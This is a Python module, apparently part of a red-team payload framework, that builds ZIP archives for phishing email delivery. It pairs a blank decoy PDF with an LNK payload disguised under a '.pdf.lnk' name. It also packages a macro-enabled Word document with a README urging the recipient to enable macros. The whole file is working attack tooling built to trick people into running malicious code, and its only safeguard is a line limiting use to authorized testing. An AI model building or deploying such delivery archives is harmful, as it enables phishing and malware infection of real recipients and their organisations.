"""ZIP delivery builder.

Packages a payload with a decoy document in a ZIP file.
Used for email attachment delivery (T1566.001).

Archive structure:
    payload.zip
    ├── Q4_Report.pdf        ← decoy (blank PDF)
    ├── Q4_Report.lnk        ← payload (icon looks like PDF)
    └── [optionally] autorun.inf  (USB delivery)

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import io
import zipfile
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


# Minimal blank 1-page PDF (well-formed)
_BLANK_PDF = (
    b"%PDF-1.4\n"
    b"1 0 obj<</Type /Catalog /Pages 2 0 R>>endobj\n"
    b"2 0 obj<</Type /Pages /Kids [3 0 R] /Count 1>>endobj\n"
    b"3 0 obj<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]>>endobj\n"
    b"xref\n0 4\n"
    b"0000000000 65535 f \n"
    b"0000000009 00000 n \n"
    b"0000000058 00000 n \n"
    b"0000000115 00000 n \n"
    b"trailer<</Size 4 /Root 1 0 R>>\n"
    b"startxref\n190\n%%EOF\n"
)


def build_zip(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build a ZIP containing a decoy document and LNK payload.

    Args:
        payload_bytes: The LNK or PS1 payload bytes.
        config:        PayloadConfig.

    Returns:
        ZIP archive bytes.
    """
    from forge_payload.delivery.lnk_builder import build_lnk

    # Build LNK wrapper if payload isn't already a LNK
    if not payload_bytes.startswith(b"L\x00"):  # Not a LNK
        lnk_bytes = build_lnk(payload_bytes, config)
    else:
        lnk_bytes = payload_bytes

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # Decoy PDF
        zf.writestr("Q4_Report_2026.pdf", _BLANK_PDF)

        # Payload LNK with PDF-like icon name
        zf.writestr("Q4_Report_2026.pdf.lnk", lnk_bytes)

    return buf.getvalue()


def build_zip_with_macro(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build a ZIP containing a VBA macro document and README.

    Args:
        payload_bytes: VBA macro bytes.
        config:        PayloadConfig.

    Returns:
        ZIP archive bytes.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Enable_Content_to_View.docm", payload_bytes)
        readme = (
            "Please enable macros to view this document.\n"
            "This document requires Microsoft Word with macros enabled.\n"
        )
        zf.writestr("README.txt", readme.encode())
    return buf.getvalue()
